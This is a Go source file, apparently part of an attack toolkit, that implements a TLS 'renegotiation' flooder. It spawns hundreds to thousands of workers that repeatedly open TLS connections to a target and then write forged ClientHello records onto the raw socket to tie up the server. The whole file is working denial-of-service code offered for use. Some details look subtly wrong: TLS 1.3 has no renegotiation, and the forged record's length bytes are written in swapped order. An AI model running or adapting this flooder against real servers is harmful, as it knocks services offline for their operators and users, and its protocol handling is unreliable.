package main

import (
	"crypto/tls"
	"math/rand"
	"net"
	"strconv"
	"sync/atomic"
	"time"
)

type TLSRenegFlooder struct {
	target string
	port   int
	workers int
	sent   atomic.Int64
	errors atomic.Int64
}

func NewTLSRenegFlooder(cfg *AttackConfig) *TLSRenegFlooder {
	w := cfg.Workers
	if w < 64 {
		w = 256
	}
	if w > 4096 {
		w = 4096
	}
	return &TLSRenegFlooder{
		target:  cfg.Target,
		port:    cfg.Port,
		workers: w,
	}
}

func (t *TLSRenegFlooder) Run(done chan struct{}) {
	addr := net.JoinHostPort(t.target, strconv.Itoa(t.port))
	for i := 0; i < t.workers; i++ {
		go func() {
			for {
				select {
				case <-done:
					return
				default:
				}
				tcpConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
				if err != nil {
					t.errors.Add(1)
					continue
				}
				tlsConn := tls.Client(tcpConn, &tls.Config{
					InsecureSkipVerify: true,
					MaxVersion:         tls.VersionTLS13,
					CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256},
				})
				if err := tlsConn.Handshake(); err != nil {
					tcpConn.Close()
					t.errors.Add(1)
					time.Sleep(10 * time.Millisecond)
					continue
				}
				t.sent.Add(1)
				for attempt := 0; attempt < 100; attempt++ {
					ch := buildFakeClientHello()
					if _, err := tcpConn.Write(ch); err != nil {
						break
					}
					t.sent.Add(1)
				}
				tlsConn.Close()
				tcpConn.Close()
				time.Sleep(time.Microsecond)
			}
		}()
	}
}

func buildFakeClientHello() []byte {
	b := make([]byte, 200)
	off := 0
	b[off] = 22
	off++
	b[off] = 3
	off++
	b[off] = 3
	off++
	hsLen := 150
	b[off] = byte(hsLen >> 8)
	off++
	b[off] = byte(hsLen)
	off++
	b[off] = 1
	off++
	b[off] = 0
	off++
	b[off] = 0
	off++
	b[off] = byte(hsLen - 4)
	off++
	b[off] = 3
	off++
	b[off] = 3
	off++
	for i := 0; i < 32; i++ {
		b[off] = byte(rand.Intn(256))
		off++
	}
	b[off] = 0
	off++
	b[off] = 0
	off++
	b[off] = 2
	off++
	b[off] = 0x13
	off++
	b[off] = 0x01
	off++
	b[off] = 1
	off++
	b[off] = 0
	off++
	b[off] = 0
	off++
	b[off] = 0
	off++
	b[3] = byte(off - 5)
	b[4] = byte((off - 5) >> 8)
	return b[:off]
}
